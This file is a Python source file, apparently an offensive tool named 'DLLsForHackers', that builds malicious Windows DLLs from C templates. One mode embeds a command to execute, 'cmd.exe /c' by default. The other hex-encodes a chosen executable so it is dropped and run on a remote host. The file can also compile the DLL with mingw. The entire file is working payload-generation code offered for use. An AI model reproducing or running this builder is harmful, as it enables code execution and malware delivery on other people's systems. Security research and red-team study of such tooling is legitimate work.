# Author Mr.Un1k0d3r

import subprocess
import binascii
import argparse
import string
import random
import time
import os
import re

print("DLLsForHackers Mr.Un1k0d3r RingZer0 Team\n----------------------------------------\n")

if not os.path.exists("output/"):
	os.makedirs("output/")

if not os.path.exists("dlls/"):
	os.makedirs("dlls/")

def gen_random_string(size):
	return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size))

def error(error, die=False):
	if os.name == "nt":
		print("[-] %s." % error)
	else:
		print("\033[31m[-] %s.\033[00m" % error)
	if die:
		os._exit(0)

def success(message):
	if os.name == "nt":
		print("[+] %s." % message)
	else:
		print("\033[32m[+] %s.\033[00m" % message)

def warn(message):
	if os.name == "nt":
		print("[*] %s." % message)
	else:
		print("\033[33m[*] %s.\033[00m" % message)
	
def file_exists(path, die=False, show_error=True):
	if os.path.exists(path):
		return True

	if show_error:
		error("%s not found" % path, die)
	return False
	
def load_file(path, die=False, show_error=True, decode=True):
	if file_exists(path, die, show_error):
		data = open(path, "rb").read()
		if decode:
			return data.decode()
		return data
	return ""
	
def save_file(path, data):
	open(path, "w+").write(data)
	
def encode_payload(payload):
	return payload.replace("\\", "\\\\").replace("\"", "\\\"")
	
def replace_template(data, var, value, encode=True):
	if encode:
		value = encode_payload(value)
	return data.replace("{{%s}}" % var, value)
	
verbose = False
compile = False
compile_path = None
out_filename = "%d.c" % int(time.time())
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="Payload type (exec,dropexec)", required=True, choices=["exec","dropexec"])
parser.add_argument("-com", "--compile", help="Path to mingw32-g++.exe")
parser.add_argument("-c", "--cmd", help="Command to run", default="cmd.exe /c")
parser.add_argument("-fn", "--filename", help="Dropped filename (optional)", default="%s.exe" % gen_random_string(10))
parser.add_argument("-fp", "--filepath", help="File to drop on the remote host", default="payload.exe")
parser.add_argument("-v", "--verbose", help="Verbose mode", default=False, choices=["true", "false"])
args = parser.parse_args()

if args.verbose == "true":
	verbose = True

if args.compile:
	compile = True
	compile_path = args.compile


if args.type == "exec":
	out_filename = "output/exec-%s" % out_filename
	success("Loading exec dll payload")
	
	file = load_file("templates/exec.c", True)
	file = replace_template(file, "cmd", args.cmd)
	
	save_file(out_filename, file)
	success("Dll source saved as '%s'" % out_filename)
	
else:
	out_filename = "output/dropexec-%s" % out_filename
	success("Loading drop exec dll payload")
	
	file = load_file("templates/dropexec.c", True)
	file = replace_template(file, "cmd", "%s %s" % (args.cmd, args.filename))
	file = replace_template(file, "filename", args.filename)
	
	success("Loading %s" % args.filepath)
	binary = binascii.hexlify(load_file(args.filepath, True, True, False)).decode()
	data = "\\x%s" % "\\x".join(re.findall("..", binary))
	
	file = replace_template(file, "data", data, False)
	file = replace_template(file, "size", str(int(len(data) / 4)))
	
	save_file(out_filename, file)
	success("Dll source saved as '%s'" % out_filename)

if compile:
	warn("Compiling the Dll using '%s' as the gcc path" % compile_path)
	file_exists(compile_path, True)
	cmd = "\"%s\" -Wall -DBUILD_DLL -O2 -c %s -o %s.o && \"%s\" -shared -Wl,--dll %s.o -o %s.dll" % (compile_path, out_filename, out_filename, compile_path, out_filename, out_filename)
	if verbose:
		warn("Compiling the Dll using the following command '%s'" % cmd)
	output = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
	
	if verbose:
		stdout, stderr = output.communicate()
		warn("Stdout: %s" % stdout.decode())
		warn("Stderr: %s" % stderr)
		
	os.remove("%s.o" % out_filename)
	os.remove(out_filename)
	os.rename("%s.dll" % out_filename, "%s.dll" % out_filename.replace("output", "dlls"))
	success("Compiled Dll saved as '%s.dll'" % out_filename.replace("output", "dlls"))  
	
success("Process completed")
